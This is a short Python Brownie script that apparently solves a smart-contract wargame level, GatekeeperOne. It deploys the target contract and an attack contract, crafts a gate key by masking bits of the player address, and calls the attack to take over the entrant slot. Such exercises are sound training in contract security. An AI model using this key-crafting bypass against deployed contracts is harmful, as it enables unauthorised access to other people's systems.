from scripts.helpful_scripts import get_account
from brownie import web3, interface, GatekeeperOne3, Attack13_gate3

GAS_LIMIT = 6000000
PLAYER = "0xF8f8269488f73fab3935555FCDdD6035699deE25"
# uint16(PLAYER) = "0xCDdD6035699deE25"
# bit mask       = "0xFFFFFFFF0000FFFF"
GATEKEY = "0xCDdD60350000eE25"


def main():

    player = get_account()
    CONTRACT = GatekeeperOne3.deploy({"from": player})
    target = interface.IGatekeeperOne(CONTRACT)

    print(f"Entrant = {target.entrant()}")

    attack = Attack13_gate3.deploy(CONTRACT, {"from": player})
    print(attack)

    attack.attack(GATEKEY, {"from": player})
    print(f"Entrant = {target.entrant()}")
